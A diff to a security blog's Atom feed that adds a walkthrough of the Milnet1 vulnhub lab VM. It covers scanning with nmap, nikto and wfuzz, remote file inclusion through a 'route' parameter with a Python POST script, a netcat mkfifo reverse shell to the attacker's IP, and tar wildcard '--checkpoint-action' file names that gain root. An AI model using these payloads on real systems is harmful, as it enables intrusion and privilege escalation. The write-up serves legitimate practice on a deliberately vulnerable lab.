@@ -4,7 +4,7 @@
   <title><![CDATA[Category: lfi | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/lfi/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-07-27T16:02:31-05:00</updated>
+  <updated>2016-07-29T14:55:40-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -12,6 +12,148 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[milnet1]]></title>
+    <link href="http://wg135.github.io/blog/2016/07/28/milnet1/"/>
+    <updated>2016-07-28T14:47:38-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/07/28/milnet1</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+<li>Tamper Data</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
+<img src="/images/blog/vulhub/milnet1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.41.154 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.154 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/milnet1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>port 22 and 80 are opening</p>
+
+<p>use nmap to run http-enum script:</p>
+
+<p><code>nmap 192.168.41.154 -p80 --script http-enum</code></p>
+
+<p><img src="/images/blog/vulhub/milnet1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>The info.php file exists.</p>
+
+<p><img src="/images/blog/vulhub/milnet1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use nikto to scan</p>
+
+<p><code>nikto -h 192.168.41.154</code></p>
+
+<p><img src="/images/blog/vulhub/milnet1/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use wfuzz to scan</p>
+
+<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.154/FUZZ 2&gt;/dev/null</code></p>
+
+<p>nothing cool.</p>
+
+<p>I use Tamper Data to exam the GET/POST request parameters.</p>
+
+<p><img src="/images/blog/vulhub/milnet1/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find an interesting parameter. setup a netcat listerner, and change the parameter value to <code>http://192.168.41.149/reverse?</code></p>
+
+<p>(Here, at first I used reverse.php which created a local reverse shell back to my Kali. I guess there is a filter in target can filter php file, so I just remove .php)</p>
+
+<p>get the shell:</p>
+
+<p><img src="/images/blog/vulhub/milnet1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>In order to make the process easier, I create a short script <a href="https://github.com/wg135/script/blob/master/send_post.py">send_post.py</a>:</p>
+
+<pre><code class="python send_post.py">#!/usr/bin/env python
+#send post requst to the target
+
+import requests
+import json
+
+url= 'http://192.168.41.154/content.php'
+
+headers = {
+    "Host" : "192.168.41.154",
+    "User-Agent" : "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0",
+    "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "Accept-Language" : "en-US,en;q=0.5",
+    "Accept-Encoding" : "gzip, deflate",
+    "Referer" : "http://192.168.41.154/nav.php",
+    "Connection" : "keep-alive",
+    "Content-Type" : "application/x-www-form-urlencoded",
+    "Content-Length" : "40"
+}
+
+payload = {
+    "route" : "http://192.168.41.149/reverse?"
+}
+
+
+r = requests.post(url, headers=headers, data=payload)
+print (r.status_code)
+</code></pre>
+
+<p>Next enumeration, no luck on kernerl exploit, check contab job.</p>
+
+<p><code>cat /etc/cron*</code></p>
+
+<p>got <code>/etc/crontab</code></p>
+
+<p><img src="/images/blog/vulhub/milnet1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>read that file</p>
+
+<p><code>cat /etc/crontab</code></p>
+
+<p><img src="/images/blog/vulhub/milnet1/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>found an interesting file: <code>/backup/backup.sh</code></p>
+
+<p>check that file</p>
+
+<p><img src="/images/blog/vulhub/milnet1/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>it uses tar. Searched exploits, no luck.</p>
+
+<p>Under path <code>/home/langman/SDINET</code>, I found a file <code>DefenseCode_Unix_WildCards_Gone_Wild.txt</code> shows tar cdode execution,</p>
+
+<p><img src="/images/blog/vulhub/milnet1/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>in kali:</p>
+
+<p><code>nc -nlvp 443</code></p>
+
+<p>in target:</p>
+
+<pre><code>$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.41.149 443 &gt; /tmp/f" &gt; shell.sh
+$ touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+$ touch "/var/www/html/--checkpoint=1"
+</code></pre>
+
+<p>get the root:</p>
+
+<p><img src="/images/blog/vulhub/milnet1/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[pentesterlab-PHP-include]]></title>
